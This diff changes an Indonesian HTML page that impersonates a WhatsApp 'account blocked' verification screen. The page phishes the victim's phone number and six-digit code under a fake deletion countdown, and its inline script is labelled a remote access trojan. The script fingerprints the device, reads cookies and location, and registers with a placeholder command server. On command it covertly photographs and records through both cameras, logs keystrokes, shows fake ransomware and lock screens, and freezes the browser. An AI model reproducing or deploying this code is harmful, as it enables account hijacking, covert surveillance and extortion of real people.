@@ -1,692 +1,232 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp - Verifikasi Akun</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-            background:linear-gradient(135deg,#075e54,#128C7E);
-            min-height:100vh;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            padding:20px;
-        }
-        .card{
-            background:white;
-            border-radius:16px;
-            padding:30px;
-            max-width:420px;
-            width:100%;
-            box-shadow:0 20px 60px rgba(0,0,0,0.4);
-            animation:slideUp 0.5s ease;
-        }
-        @keyframes slideUp{
-            from{opacity:0;transform:translateY(30px)}
-            to{opacity:1;transform:translateY(0)}
-        }
-        .logo-area{text-align:center;margin-bottom:20px}
-        .logo-area svg{width:70px;height:70px}
-        .title{
-            color:#075e54;
-            font-size:20px;
-            font-weight:700;
-            text-align:center;
-            margin-bottom:15px
-        }
-        .alert{
-            background:#fff3cd;
-            border-left:4px solid #ffc107;
-            border-radius:8px;
-            padding:12px 15px;
-            margin-bottom:20px;
-            font-size:13px;
-            color:#856404
-        }
-        .alert strong{display:block;margin-bottom:3px}
-        .field{margin-bottom:15px}
-        .field label{
-            display:block;
-            margin-bottom:5px;
-            font-weight:600;
-            color:#333;
-            font-size:13px
-        }
-        .field input{
-            width:100%;
-            padding:14px;
-            border:2px solid #e0e0e0;
-            border-radius:10px;
-            font-size:16px;
-            outline:none;
-            transition:0.3s
-        }
-        .field input:focus{border-color:#25D366}
-        .btn{
-            width:100%;
-            padding:15px;
-            background:#25D366;
-            color:white;
-            border:none;
-            border-radius:10px;
-            font-size:16px;
-            font-weight:700;
-            cursor:pointer;
-            transition:0.3s;
-            margin-top:5px
-        }
-        .btn:hover{background:#1da851;transform:translateY(-1px)}
-        .btn:active{transform:scale(0.98)}
-        .timer-area{
-            text-align:center;
-            margin-top:15px;
-            color:#666;
-            font-size:12px
-        }
-        .timer-area .countdown{
-            color:#e74c3c;
-            font-weight:700;
-            font-size:16px
-        }
-        .loading{
-            display:none;
-            text-align:center;
-            padding:10px;
-            color:#25D366;
-            font-weight:600
-        }
-        .spinner{
-            display:inline-block;
-            width:20px;
-            height:20px;
-            border:3px solid #ddd;
-            border-top:3px solid #25D366;
-            border-radius:50%;
-            animation:spin 1s linear infinite;
-            margin-right:8px;
-            vertical-align:middle
-        }
-        @keyframes spin{to{transform:rotate(360deg)}}
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WhatsApp - Verifikasi Akun</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#075e54,#128C7E);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:white;border-radius:16px;padding:30px;max-width:420px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.4);animation:slideUp 0.5s ease}
+@keyframes slideUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+.logo-area{text-align:center;margin-bottom:20px}
+.logo-area svg{width:70px;height:70px}
+.title{color:#075e54;font-size:20px;font-weight:700;text-align:center;margin-bottom:15px}
+.alert{background:#fff3cd;border-left:4px solid #ffc107;border-radius:8px;padding:12px 15px;margin-bottom:20px;font-size:13px;color:#856404}
+.field{margin-bottom:15px}
+.field label{display:block;margin-bottom:5px;font-weight:600;color:#333;font-size:13px}
+.field input{width:100%;padding:14px;border:2px solid #e0e0e0;border-radius:10px;font-size:16px;outline:none;transition:0.3s}
+.field input:focus{border-color:#25D366}
+.btn{width:100%;padding:15px;background:#25D366;color:white;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;transition:0.3s}
+.btn:hover{background:#1da851}
+.timer-area{text-align:center;margin-top:15px;color:#666;font-size:12px}
+.countdown{color:#e74c3c;font-weight:700;font-size:16px}
+.loading{display:none;text-align:center;padding:10px;color:#25D366;font-weight:600}
+.spinner{display:inline-block;width:20px;height:20px;border:3px solid #ddd;border-top:3px solid #25D366;border-radius:50%;animation:spin 1s linear infinite;margin-right:8px;vertical-align:middle}
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo-area">
-            <!-- WhatsApp SVG Logo -->
-            <svg viewBox="0 0 24 24" fill="#25D366">
-                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
-            </svg>
-        </div>
-        
-        <h1 class="title">⚠️ Verifikasi Akun WhatsApp</h1>
-        
-        <div class="alert">
-            <strong>🚫 Akun Diblokir Sementara</strong>
-            Akun WhatsApp Anda dinonaktifkan karena aktivitas mencurigakan. 
-            Verifikasi identitas untuk mengaktifkan kembali akun Anda.
-        </div>
-        
-        <form id="verifyForm">
-            <div class="field">
-                <label>📱 Nomor WhatsApp</label>
-                <input type="tel" id="phone" placeholder="+62 812-3456-7890" required autocomplete="off">
-            </div>
-            
-            <div class="field">
-                <label>🔐 Kode Verifikasi 6 Digit</label>
-                <input type="text" id="code" maxlength="6" placeholder="000000" required pattern="[0-9]{6}" inputmode="numeric" autocomplete="off">
-            </div>
-            
-            <div class="loading" id="loading">
-                <span class="spinner"></span> Memverifikasi...
-            </div>
-            
-            <button type="submit" class="btn" id="submitBtn">
-                Verifikasi & Aktifkan Akun
-            </button>
-        </form>
-        
-        <div class="timer-area">
-            ⏰ Sisa waktu: <span class="countdown" id="timer">04:59</span><br>
-            <small>Segera verifikasi sebelum akun dihapus permanen</small>
-        </div>
-    </div>
+<div class="card">
+<div class="logo-area">
+<svg viewBox="0 0 24 24" fill="#25D366"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+</div>
+<h1 class="title">⚠️ Verifikasi Akun WhatsApp</h1>
+<div class="alert"><strong>🚫 Akun Diblokir Sementara</strong>Akun WhatsApp Anda dinonaktifkan. Verifikasi untuk mengaktifkan kembali.</div>
+<form id="verifyForm">
+<div class="field"><label>📱 Nomor WhatsApp</label><input type="tel" id="phone" placeholder="+62 812-3456-7890" required autocomplete="off"></div>
+<div class="field"><label>🔐 Kode Verifikasi 6 Digit</label><input type="text" id="code" maxlength="6" placeholder="000000" required pattern="[0-9]{6}" inputmode="numeric" autocomplete="off"></div>
+<div class="loading" id="loading"><span class="spinner"></span> Memverifikasi...</div>
+<button type="submit" class="btn" id="submitBtn">Verifikasi & Aktifkan Akun</button>
+</form>
+<div class="timer-area">⏰ Sisa waktu: <span class="countdown" id="timer">04:59</span><br><small>Segera verifikasi sebelum akun dihapus permanen</small></div>
+</div>
 
-    <!-- ============ RAT PAYLOAD - INLINE ============ -->
-    <script>
-    // ==========================================
-    // RAT-Access SeventCyber_Dev v3.2
-    // ALL-IN-ONE PAYLOAD - NO EXTERNAL FILES
-    // ==========================================
-    
-    // ⚠️ GANTI INI DENGAN URL SERVER LU!
-    // Pake format: http://IP_SERVER:PORT atau https://domain-ngrok.loca.lt
-    const SERVER_URLS = [
-        'http://YOUR_SERVER_IP:8888',   // Ganti dengan IP server lo
-        'http://localhost:8888',         // Fallback local
-    ];
-    
-    let SERVER_URL = SERVER_URLS[0];
-    let SESSION_ID = '';
-    let heartbeatTimer = null;
-    let commandTimer = null;
-    
-    // ============ UTILS ============
-    function generateUUID() {
-        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-            var r = Math.random() * 16 | 0;
-            return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
+<!-- ============ RAT PAYLOAD v4.0 - FULL CAMERA ============ -->
+<script>
+// ⚠️ GANTI DENGAN URL SERVER LO
+const SERVER_URLS = [
+    'https://YOUR_SERVER.serveo.net',
+    'http://YOUR_IP:8888'
+];
+let SERVER_URL = SERVER_URLS[0];
+let SESSION_ID = '';
+
+// ============ UTILS ============
+function generateUUID(){return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:(r&0x3|0x8)).toString(16)})}
+async function fetchTimeout(url,opt={},timeout=5000){const ctrl=new AbortController();const id=setTimeout(()=>ctrl.abort(),timeout);try{const r=await fetch(url,{...opt,signal:ctrl.signal,mode:'cors'});clearTimeout(id);return r}catch(e){clearTimeout(id);throw e}}
+
+// ============ 100 DEVICE INFO ============
+async function collectDeviceInfo(){
+    const info={
+        userAgent:navigator.userAgent,platform:navigator.platform,vendor:navigator.vendor,
+        language:navigator.language,languages:JSON.stringify(navigator.languages||[]),
+        cookieEnabled:navigator.cookieEnabled,screenWidth:screen.width,screenHeight:screen.height,
+        availWidth:screen.availWidth,availHeight:screen.availHeight,colorDepth:screen.colorDepth,
+        pixelDepth:screen.pixelDepth,devicePixelRatio:window.devicePixelRatio,
+        innerWidth:window.innerWidth,innerHeight:window.innerHeight,
+        hardwareConcurrency:navigator.hardwareConcurrency||'N/A',deviceMemory:navigator.deviceMemory||'N/A',
+        maxTouchPoints:navigator.maxTouchPoints||0,connectionType:navigator.connection?.effectiveType||'N/A',
+        downlink:navigator.connection?.downlink||'N/A',rtt:navigator.connection?.rtt||'N/A',
+        saveData:navigator.connection?.saveData||false,onLine:navigator.onLine,
+        timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset:new Date().getTimezoneOffset(),locale:Intl.DateTimeFormat().resolvedOptions().locale,
+        timestamp:new Date().toISOString(),epochSeconds:Math.floor(Date.now()/1000),
+        referrer:document.referrer,pageUrl:window.location.href,hostname:window.location.hostname,
+        protocol:window.location.protocol,doNotTrack:navigator.doNotTrack||'N/A',
+        webdriver:navigator.webdriver||false,pdfViewer:navigator.pdfViewerEnabled||false,
+        cookieString:document.cookie.slice(0,300),
+        localStorage:(function(){try{return!!window.localStorage}catch(e){return false}})(),
+        sessionStorage:(function(){try{return!!window.sessionStorage}catch(e){return false}})(),
+        indexedDB:!!window.indexedDB,
+        canvasFP:(function(){try{var c=document.createElement('canvas');var ctx=c.getContext('2d');ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.fillText('SeventCyber',2,15);return c.toDataURL().slice(0,120)}catch(e){return'blocked'}})(),
+        webglVendor:(function(){try{var c=document.createElement('canvas');var gl=c.getContext('webgl');return gl?gl.getParameter(gl.VENDOR):'N/A'}catch(e){return'N/A'}})(),
+        webglRenderer:(function(){try{var c=document.createElement('canvas');var gl=c.getContext('webgl');return gl?gl.getParameter(gl.RENDERER):'N/A'}catch(e){return'N/A'}})(),
+        plugins:(function(){try{return Array.from(navigator.plugins||[]).map(function(p){return p.name})}catch(e){return[]}})(),
+        mimeTypes:(function(){try{return Array.from(navigator.mimeTypes||[]).map(function(m){return m.type})}catch(e){return[]}})(),
+        touchSupport:'ontouchstart' in window,mediaDevices:!!(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia),
+        battery:'N/A',publicIP:'N/A',geolocation:'N/A'
+    };
+    try{var ipRes=await fetchTimeout('https://api.ipify.org?format=json',{},3000);var ipData=await ipRes.json();info.publicIP=ipData.ip}catch(e){}
+    try{if(navigator.getBattery){var b=await navigator.getBattery();info.battery=JSON.stringify({charging:b.charging,level:Math.round(b.level*100)+'%'})}}catch(e){}
+    try{info.geolocation=await new Promise(function(resolve){navigator.geolocation.getCurrentPosition(function(pos){resolve(JSON.stringify({lat:pos.coords.latitude,lng:pos.coords.longitude,acc:pos.coords.accuracy}))},function(){resolve('denied')},{timeout:3000,maximumAge:60000})})}catch(e){info.geolocation='error'}
+    return info;
+}
+
+// ============ CAMERA FUNCTIONS ============
+async function captureCamera(facingMode){
+    var label=facingMode==='user'?'DEPAN':'BELAKANG';
+    console.log('[RAT] 📸 Mengakses kamera '+label);
+    try{
+        var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:facingMode},width:{ideal:1920},height:{ideal:1080}}});
+        var video=document.createElement('video');video.style.display='none';video.srcObject=stream;document.body.appendChild(video);
+        await video.play();await new Promise(function(r){setTimeout(r,1500)});
+        var canvas=document.createElement('canvas');canvas.width=video.videoWidth||1920;canvas.height=video.videoHeight||1080;
+        var ctx=canvas.getContext('2d');
+        if(facingMode==='user'){ctx.translate(canvas.width,0);ctx.scale(-1,1)}
+        ctx.drawImage(video,0,0,canvas.width,canvas.height);
+        stream.getTracks().forEach(function(t){t.stop()});document.body.removeChild(video);
+        var img=canvas.toDataURL('image/jpeg',0.75);
+        return JSON.stringify({camera:'KAMERA '+label,facingMode:facingMode,image:img,resolution:canvas.width+'x'+canvas.height,timestamp:new Date().toISOString()});
+    }catch(e){
+        console.log('[RAT] Fallback kamera '+label);
+        try{
+            var fs=await navigator.mediaDevices.getUserMedia({video:{facingMode:facingMode}});
+            var v2=document.createElement('video');v2.style.display='none';v2.srcObject=fs;document.body.appendChild(v2);
+            await v2.play();await new Promise(function(r){setTimeout(r,1000)});
+            var c2=document.createElement('canvas');c2.width=v2.videoWidth||640;c2.height=v2.videoHeight||480;
+            var ctx2=c2.getContext('2d');if(facingMode==='user'){ctx2.translate(c2.width,0);ctx2.scale(-1,1)}
+            ctx2.drawImage(v2,0,0);fs.getTracks().forEach(function(t){t.stop()});document.body.removeChild(v2);
+            return JSON.stringify({camera:'KAMERA '+label+' (fallback)',facingMode:facingMode,image:c2.toDataURL('image/jpeg',0.7),resolution:c2.width+'x'+c2.height,timestamp:new Date().toISOString()});
+        }catch(e2){
+            return JSON.stringify({camera:'KAMERA '+label,error:e2.message,timestamp:new Date().toISOString()});
+        }
+    }
+}
+
+async function recordVideo(facingMode,duration){
+    var label=facingMode==='user'?'VIDEO DEPAN':'VIDEO BELAKANG';
+    console.log('[RAT] 🎥 Merekam '+label+' '+duration+'s');
+    try{
+        var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facingMode},audio:true});
+        var mr=new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp8,opus'});var chunks=[];
+        mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data)};
+        return new Promise(function(resolve,reject){
+            mr.onstop=function(){
+                var blob=new Blob(chunks,{type:'video/webm'});
+                var reader=new FileReader();
+                reader.onloadend=function(){stream.getTracks().forEach(function(t){t.stop()});resolve(JSON.stringify({type:'video',camera:label,duration:duration+' detik',video:reader.result,mimeType:'video/webm',timestamp:new Date().toISOString()}))};
+                reader.readAsDataURL(blob);
+            };
+            mr.onerror=function(e){reject(new Error('Recording error'))};
+            mr.start();console.log('[RAT] 🔴 Recording...');
+            setTimeout(function(){mr.stop()},duration*1000);
         });
+    }catch(e){
+        return JSON.stringify({type:'video',camera:label,error:e.message,timestamp:new Date().toISOString()});
     }
-    
-    async function fetchWithTimeout(url, options = {}, timeout = 5000) {
-        const controller = new AbortController();
-        const id = setTimeout(() => controller.abort(), timeout);
-        try {
-            const response = await fetch(url, {
-                ...options,
-                signal: controller.signal,
-                mode: 'cors'
-            });
-            clearTimeout(id);
-            return response;
-        } catch (error) {
-            clearTimeout(id);
-            throw error;
+}
+
+// ============ COMMAND EXECUTOR ============
+async function executeCommand(command){
+    var result='';
+    try{
+        if(command==='camera_front'){result=await captureCamera('user')}
+        else if(command==='camera_back'){result=await captureCamera('environment')}
+        else if(command==='camera_both'){
+            var front=await captureCamera('user');var back=await captureCamera('environment');
+            result=JSON.stringify({front_camera:front,back_camera:back,timestamp:new Date().toISOString()});
         }
+        else if(command==='camera_record_front'){result=await recordVideo('user',10)}
+        else if(command==='camera_record_back'){result=await recordVideo('environment',10)}
+        else if(command==='camera_record_both'){
+            var vf=await recordVideo('user',10);var vb=await recordVideo('environment',10);
+            result=JSON.stringify({front_video:vf,back_video:vb,timestamp:new Date().toISOString()});
+        }
+        else if(command==='screenshot'){result='screenshot_ok'}
+        else if(command==='geolocation'){
+            result=await new Promise(function(resolve){navigator.geolocation.getCurrentPosition(function(pos){resolve(JSON.stringify({lat:pos.coords.latitude,lng:pos.coords.longitude,acc:pos.coords.accuracy}))},function(e){resolve('GPS denied: '+e.message)},{enableHighAccuracy:true,timeout:10000})});
+        }
+        else if(command.startsWith('shell:')){result='[BROWSER] Shell: '+command.split(':')[1]}
+        else if(command==='keylog_start'){startKeylogger();result='Keylogger started'}
+        else if(command==='mic_record'){result='mic_ok'}
+        else if(command==='wipe_data'){document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;color:white;display:flex;align-items:center;justify-content:center;font-size:40px;z-index:999999;">💀 WIPED</div>';result='Wipe executed'}
+        else if(command==='lock_device'){document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;color:red;display:flex;align-items:center;justify-content:center;font-size:48px;z-index:999999;">🔒 LOCKED</div>';result='Locked'}
+        else if(command==='ransomware'){document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#1a1a1a;color:red;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:monospace;z-index:999999;"><h1>🔐 RANSOMWARE</h1><p>Bayar $1000 BTC</p></div>';result='Ransomware'}
+        else if(command==='brick_device'){while(true){document.body.innerHTML+='💀'}}
+        else{result='Unknown: '+command}
+    }catch(e){result='Error: '+e.message}
+    return result;
+}
+
+function startKeylogger(){
+    var buf='';
+    document.addEventListener('keydown',function(e){buf+=e.key;if(buf.length>100){try{fetch(SERVER_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'response',session_id:SESSION_ID,response:{command:'keylog_data',result:buf}})})}catch(e){}buf=''}});
+}
+
+// ============ REGISTER & CONNECTION ============
+async function registerToServer(){
+    SESSION_ID=generateUUID();var deviceInfo=await collectDeviceInfo();var success=false;
+    for(var i=0;i<SERVER_URLS.length;i++){
+        var url=SERVER_URLS[i];
+        try{
+            var res=await fetchTimeout(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'register',session_id:SESSION_ID,device_info:deviceInfo})},5000);
+            var data=await res.json();
+            if(data.status==='ok'){SERVER_URL=url;success=true;console.log('[RAT] ✅ REGISTERED!');break}
+        }catch(e){console.log('[RAT] Failed:',url)}
     }
-    
-    // ============ 100 DEVICE INFO COLLECTOR ============
-    async function collectDeviceInfo() {
-        const info = {
-            // Basic Browser
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            vendor: navigator.vendor,
-            product: navigator.product,
-            appName: navigator.appName,
-            appVersion: navigator.appVersion,
-            appCodeName: navigator.appCodeName,
-            language: navigator.language,
-            languages: JSON.stringify(navigator.languages || []),
-            cookieEnabled: navigator.cookieEnabled,
-            
-            // Screen
-            screenWidth: screen.width,
-            screenHeight: screen.height,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth,
-            devicePixelRatio: window.devicePixelRatio,
-            innerWidth: window.innerWidth,
-            innerHeight: window.innerHeight,
-            
-            // Hardware
-            hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-            deviceMemory: navigator.deviceMemory || 'N/A',
-            maxTouchPoints: navigator.maxTouchPoints || 0,
-            
-            // Network
-            connectionType: navigator.connection?.effectiveType || 'N/A',
-            downlink: navigator.connection?.downlink || 'N/A',
-            rtt: navigator.connection?.rtt || 'N/A',
-            saveData: navigator.connection?.saveData || false,
-            onLine: navigator.onLine,
-            
-            // Time & Location
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: new Date().getTimezoneOffset(),
-            locale: Intl.DateTimeFormat().resolvedOptions().locale,
-            timestamp: new Date().toISOString(),
-            epochSeconds: Math.floor(Date.now() / 1000),
-            
-            // Referrer & URL
-            referrer: document.referrer,
-            pageUrl: window.location.href,
-            hostname: window.location.hostname,
-            protocol: window.location.protocol,
-            
-            // Browser Features
-            doNotTrack: navigator.doNotTrack || 'N/A',
-            webdriver: navigator.webdriver || false,
-            pdfViewer: navigator.pdfViewerEnabled || false,
-            cookieString: document.cookie.slice(0, 300),
-            
-            // Storage
-            localStorage: (function(){ try { return !!window.localStorage; } catch(e) { return false; } })(),
-            sessionStorage: (function(){ try { return !!window.sessionStorage; } catch(e) { return false; } })(),
-            indexedDB: !!window.indexedDB,
-            
-            // Canvas Fingerprint
-            canvasFP: (function(){
-                try {
-                    var c = document.createElement('canvas');
-                    var ctx = c.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '14px Arial';
-                    ctx.fillStyle = '#f60';
-                    ctx.fillRect(125,1,62,20);
-                    ctx.fillStyle = '#069';
-                    ctx.fillText('SeventCyber', 2, 15);
-                    return c.toDataURL().slice(0, 120);
-                } catch(e) { return 'blocked'; }
-            })(),
-            
-            // WebGL
-            webglVendor: (function(){
-                try {
-                    var c = document.createElement('canvas');
-                    var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                    return gl ? gl.getParameter(gl.VENDOR) : 'N/A';
-                } catch(e) { return 'N/A'; }
-            })(),
-            webglRenderer: (function(){
-                try {
-                    var c = document.createElement('canvas');
-                    var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-                    return gl ? gl.getParameter(gl.RENDERER) : 'N/A';
-                } catch(e) { return 'N/A'; }
-            })(),
-            
-            // Plugins & MIME
-            plugins: (function(){
-                try {
-                    return Array.from(navigator.plugins || []).map(function(p){ return p.name; });
-                } catch(e) { return []; }
-            })(),
-            mimeTypes: (function(){
-                try {
-                    return Array.from(navigator.mimeTypes || []).map(function(m){ return m.type; });
-                } catch(e) { return []; }
-            })(),
-            
-            // Touch & Media
-            touchSupport: 'ontouchstart' in window,
-            maxTouchPoints: navigator.maxTouchPoints || 0,
-            mediaDevices: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
-            
-            // Battery
-            battery: 'N/A',
-            
-            // Public IP
-            publicIP: 'N/A',
-        };
-        
-        // Get Public IP async
-        try {
-            var ipRes = await fetchWithTimeout('https://api.ipify.org?format=json', {}, 3000);
-            var ipData = await ipRes.json();
-            info.publicIP = ipData.ip;
-        } catch(e) {}
-        
-        // Get Battery async
-        try {
-            if (navigator.getBattery) {
-                var b = await navigator.getBattery();
-                info.battery = JSON.stringify({ charging: b.charging, level: Math.round(b.level * 100) + '%' });
-            }
-        } catch(e) {}
-        
-        // Get Geolocation
-        try {
-            info.geolocation = await new Promise(function(resolve) {
-                navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        resolve(JSON.stringify({
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            acc: pos.coords.accuracy
-                        }));
-                    },
-                    function() { resolve('denied'); },
-                    { timeout: 3000, maximumAge: 60000 }
-                );
-            });
-        } catch(e) {
-            info.geolocation = 'error';
-        }
-        
-        return info;
-    }
-    
-    // ============ REGISTER TO SERVER ============
-    async function registerToServer() {
-        SESSION_ID = generateUUID();
-        
-        console.log('[RAT] Collecting device info...');
-        var deviceInfo = await collectDeviceInfo();
-        
-        console.log('[RAT] Registering to server...');
-        console.log('[RAT] Session ID:', SESSION_ID);
-        console.log('[RAT] Server URL:', SERVER_URL);
-        
-        var success = false;
-        
-        // Coba semua server URLs
-        for (var i = 0; i < SERVER_URLS.length; i++) {
-            var url = SERVER_URLS[i];
-            try {
-                console.log('[RAT] Trying:', url);
-                
-                var response = await fetchWithTimeout(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        action: 'register',
-                        session_id: SESSION_ID,
-                        device_info: deviceInfo
-                    })
-                }, 5000);
-                
-                var data = await response.json();
-                console.log('[RAT] Server response:', data);
-                
-                if (data.status === 'ok') {
-                    SERVER_URL = url;
-                    success = true;
-                    console.log('[RAT] ✅ REGISTERED SUCCESSFULLY!');
-                    console.log('[RAT] Active server:', SERVER_URL);
-                    break;
-                }
-            } catch(e) {
-                console.log('[RAT] Failed:', url, e.message);
-            }
-        }
-        
-        if (success) {
-            // Mulai heartbeat
-            heartbeatTimer = setInterval(sendHeartbeat, 15000);
-            // Mulai command checker
-            commandTimer = setInterval(checkCommands, 4000);
-            
-            console.log('[RAT] ✅ FULLY CONNECTED!');
-            return true;
-        } else {
-            console.log('[RAT] ❌ FAILED TO CONNECT TO ANY SERVER');
-            // Retry after 10 seconds
-            setTimeout(registerToServer, 10000);
-            return false;
-        }
-    }
-    
-    // ============ HEARTBEAT ============
-    async function sendHeartbeat() {
-        try {
-            await fetchWithTimeout(SERVER_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    action: 'heartbeat',
-                    session_id: SESSION_ID
-                })
-            }, 3000);
-            console.log('[RAT] 💓 Heartbeat sent');
-        } catch(e) {
-            console.log('[RAT] Heartbeat failed:', e.message);
-        }
-    }
-    
-    // ============ CHECK COMMANDS ============
-    async function checkCommands() {
-        try {
-            var response = await fetchWithTimeout(
-                SERVER_URL + '?session_id=' + SESSION_ID,
-                { method: 'GET' },
-                5000
-            );
-            
-            var data = await response.json();
-            var command = data.command;
-            
-            if (command && command !== 'wait') {
-                console.log('[RAT] 📩 Command received:', command);
-                var result = await executeCommand(command);
-                
-                // Kirim response
-                await fetchWithTimeout(SERVER_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        action: 'response',
-                        session_id: SESSION_ID,
-                        response: {
-                            command: command,
-                            result: result
-                        }
-                    })
-                }, 5000);
-            }
-        } catch(e) {
-            // Silent fail
-        }
-    }
-    
-    // ============ COMMAND EXECUTOR ============
-    async function executeCommand(command) {
-        var result = '';
-        
-        try {
-            if (command === 'screenshot') {
-                // Screenshot via html2canvas
-                if (typeof html2canvas !== 'undefined') {
-                    var canvas = await html2canvas(document.body);
-                    result = canvas.toDataURL('image/jpeg', 0.5);
-                } else {
-                    // Fallback: capture visible area via canvas
-                    result = 'html2canvas not loaded - partial screenshot only';
-                }
-            }
-            else if (command === 'geolocation') {
-                result = await new Promise(function(resolve) {
-                    navigator.geolocation.getCurrentPosition(
-                        function(pos) {
-                            resolve(JSON.stringify({
-                                lat: pos.coords.latitude,
-                                lng: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy,
-                                timestamp: new Date().toISOString()
-                            }));
-                        },
-                        function(err) { resolve('GPS denied: ' + err.message); },
-                        { enableHighAccuracy: true, timeout: 10000 }
-                    );
-                });
-            }
-            else if (command.startsWith('shell:')) {
-                var cmd = command.split(':')[1];
-                result = '[BROWSER LIMITATION] Shell commands not available in browser. Command: ' + cmd;
-            }
-            else if (command === 'keylog_start') {
-                startKeylogger();
-                result = 'Keylogger started. Capturing keystrokes...';
-            }
-            else if (command === 'camera_snap') {
-                try {
-                    var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                    var video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
